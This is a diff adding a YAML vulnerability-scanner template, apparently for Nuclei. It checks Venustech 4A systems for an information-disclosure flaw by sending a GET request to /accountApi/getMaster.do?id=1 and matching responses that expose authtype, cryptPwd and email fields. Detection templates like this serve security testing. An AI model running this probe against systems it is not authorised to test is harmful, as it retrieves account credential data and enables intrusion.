@@ -1,0 +1,26 @@
+id: venustech-4a-getMaster-disclosure
+
+info:
+  name: "Venustech 4A getMaster.do 接口信息泄露"
+  author: Co5mos
+  severity: high
+  tags: Venustech-4A
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/accountApi/getMaster.do?id=1"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'authtype'
+          - 'cryptPwd'
+          - 'email'
+        condition: and
+
+      - type: status
+        status:
+          - 200
